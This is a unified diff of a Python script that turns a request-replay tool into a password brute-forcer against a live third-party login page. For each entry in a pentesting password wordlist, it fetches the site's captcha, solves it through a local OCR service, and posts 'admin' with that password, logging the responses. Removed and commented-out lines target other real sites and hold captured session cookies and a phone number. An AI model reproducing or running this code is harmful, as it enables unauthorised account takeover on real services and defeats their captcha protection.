@@ -1,16 +1,14 @@
 import json
 import random
 import sys
-import time
 from datetime import datetime
 from urllib import parse
-import execjs
 
+import execjs
 import requests
 from selenium import webdriver
-from selenium.webdriver.common.action_chains import ActionChains
-from selenium.webdriver.common.proxy import Proxy
 from selenium.webdriver.common.by import By
+from selenium.webdriver.common.proxy import Proxy
 from selenium.webdriver.common.proxy import ProxyType
 
 node = execjs.get()
@@ -276,7 +274,7 @@ def open_txt_yzm():
               'a+', encoding='utf-8') as f2:
         with open('repeat_request_tool_js.js', encoding='utf-8') as js_code:
             ctx = node.compile(js_code.read())
-            with open(sys.path[0] + '/test.txt', 'r', encoding='utf-8') as f:
+            with open("D:\study\st\dict\Dictionary-Of-Pentesting\Password\password1.txt", 'r', encoding='utf-8') as f:
                 read_data = f.readlines()
                 for i in range(len(read_data)):
                     line = read_data[i].strip()
@@ -286,42 +284,62 @@ def open_txt_yzm():
                     # s = ctx.call("maincompute")
                     import requests
 
-                    burp0_url = "https://talent.pingan.com:443/zztj-recruitment-external-webserver/rcrt/headhunter/login/getImage?t=1701072717325"
-                    burp0_cookies = {"SESSION": "57cb69b9-49ee-4708-bca7-c436d563cddf", "WEBTRENDS_ID": "60b69e98-ee60-5661-cd35-e435e8b980df", "FP_AUTH_PK": "MTE3ODEwOTIyNTAyOTU5OTIzMg==", "AJLKFJ": "MTE3ODEwOTIyNTAyOTU5OTIzMg==", "BIGipServerPOOL_PACLOUD_PRDR2017120709645": "1156716972.33916.0000", "WEBTRENDS_ID": "60b69e98-ee60-5661-cd35-e435e8b980df", "__SK_cookieId": "9666920564713021701066278930", "__SK_cookieId": "9666920564713021701066278930"}
-                    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0", "Content-Type": "application/json;charset=utf-8", "Accept": "*/*", "Origin": "https://talent.pingan.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://talent.pingan.com/partner/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6", "Connection": "close"}
-                    res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-                    vurl = "http://127.0.0.1:8899/base64"
-                    data_ = "data:image/png;base64,"+json.loads(res.text)['data']['base64']
+                    # burp0_url = "https://24h.bianjie.xin:443//login.shtml"
+                    # burp0_cookies = {"PHPSESSID": "f3db5d1a7efc8810e08574772b86bda1"}
+                    # burp0_headers = {"Pragma": "no-cacyhe", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://24h.bianjie.xin", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://24h.bianjie.xin//login.shtml", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6", "Priority": "u=1, i"}
+                    # burp0_data = {"username": "admin", "password": "\xa7xxxx123\xa7", "captcha": "yvmd"}
+                    # res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+                    re = "验证码错误"
+                    while re=="验证码错误":
 
-                    #b'base64=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
-                    res1 = requests.post(vurl,
-                                         data=data_)
-                    #
-                    # burp0_url = "https://v.qijiduanju.com:443/api/user/mobilelogin"
-                        # burp0_cookies = {
-                    #     "_vid_t": "Woby1m4asqMbmesy8GZJ4byEecyndV2hMoczqfTKaiXpjltfp9tDaZOck0R3x5u9PEN6vkEGhXXiKgadi967s05RIA=="}
-                    # burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache",
-                    #                  "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Microsoft Edge\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
-                    #                  "Locale": "zh_CN", "Sec-Ch-Ua-Mobile": "?0",
-                    #                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68",
-                    #                  "Content-Type": "application/json;charset=UTF-8", "X-Requested-Token": "",
-                    #                  "Token": "", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "*/*",
-                    #                  "Origin": "https://v.qijiduanju.com", "Sec-Fetch-Site": "same-origin",
-                    #                  "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-                    #                  "Referer": "https://v.qijiduanju.com/h5/index.html",
-                    #                  "Accept-Encoding": "gzip, deflate",
-                    #                  "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6"}
-                    # burp0_json = {"captcha": v1, "code": "", "codeid": "13e40d826762f654cadc6a22115432f2",
-                    #               "deviceid": "7jyz", "event": "login", "mobile": "17680492987",
-                    #               "opcodes": "fVUg0niB8biUbvTVwFEj", "source": "windows", "tcode": 1683371922,
-                    #               "versionNum": "1.0.9"}
-                    # res2 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
+                        burp0_url = "https://24h.bianjie.xin:443/?s=/captcha"
+                        burp0_cookies = {"PHPSESSID": "f3db5d1a7efc8810e08574772b86bda1"}
+                        burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "image", "Referer": "https://24h.bianjie.xin//login.shtml", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6", "Priority": "i"}
+                        res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
 
-                    if res1.status_code != 400:  # 429
-                        print(res1.text)
-                        # print(html.text.decode(''))
-                        f2.writelines(res1.text)
-                        f2.flush()
+                        res.raise_for_status()
+                        vurl = "http://127.0.0.1:8899/png"
+                        # data_ = "data:image/png;base64,"+json.loads(res.text)['data']['base64']
+                        data_ = res.content
+                        #b'base64=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
+                        res1 = requests.post(vurl,
+                                             data=data_)
+                        #
+                        # burp0_url = "https://v.qijiduanju.com:443/api/user/mobilelogin"
+                            # burp0_cookies = {
+                        #     "_vid_t": "Woby1m4asqMbmesy8GZJ4byEecyndV2hMoczqfTKaiXpjltfp9tDaZOck0R3x5u9PEN6vkEGhXXiKgadi967s05RIA=="}
+                        # burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache",
+                        #                  "Sec-Ch-Ua": "\"Chromium\";v=\"112\", \"Microsoft Edge\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
+                        #                  "Locale": "zh_CN", "Sec-Ch-Ua-Mobile": "?0",
+                        #                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68",
+                        #                  "Content-Type": "application/json;charset=UTF-8", "X-Requested-Token": "",
+                        #                  "Token": "", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "*/*",
+                        #                  "Origin": "https://v.qijiduanju.com", "Sec-Fetch-Site": "same-origin",
+                        #                  "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
+                        #                  "Referer": "https://v.qijiduanju.com/h5/index.html",
+                        #                  "Accept-Encoding": "gzip, deflate",
+                        #                  "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6"}
+                        # burp0_json = {"captcha": v1, "code": "", "codeid": "13e40d826762f654cadc6a22115432f2",
+                        #               "deviceid": "7jyz", "event": "login", "mobile": "17680492987",
+                        #               "opcodes": "fVUg0niB8biUbvTVwFEj", "source": "windows", "tcode": 1683371922,
+                        #               "versionNum": "1.0.9"}
+                        # res2 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
+
+                        burp0_url = "https://24h.bianjie.xin:443//login.shtml"
+                        burp0_cookies = {"PHPSESSID": "f3db5d1a7efc8810e08574772b86bda1"}
+                        burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://24h.bianjie.xin", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://24h.bianjie.xin//login.shtml", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6", "Priority": "u=1, i"}
+                        burp0_data = {"username": "admin", "password": line, "captcha": res1.text}
+                        res2 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+                        res2.raise_for_status()
+                        msgs = json.loads(res2.text)
+                        re =msgs['msg']
+                        if res1.status_code != 400 and re != "验证码错误":  # 429
+                            print(res1.text)
+                            print(res2.text)
+                            # print(html.text.decode(''))
+                            f2.writelines(res1.text+'\n')
+                            f2.writelines(res2.text+line+'\n')
+                            f2.flush()
 
 
 # 读文件切割重发
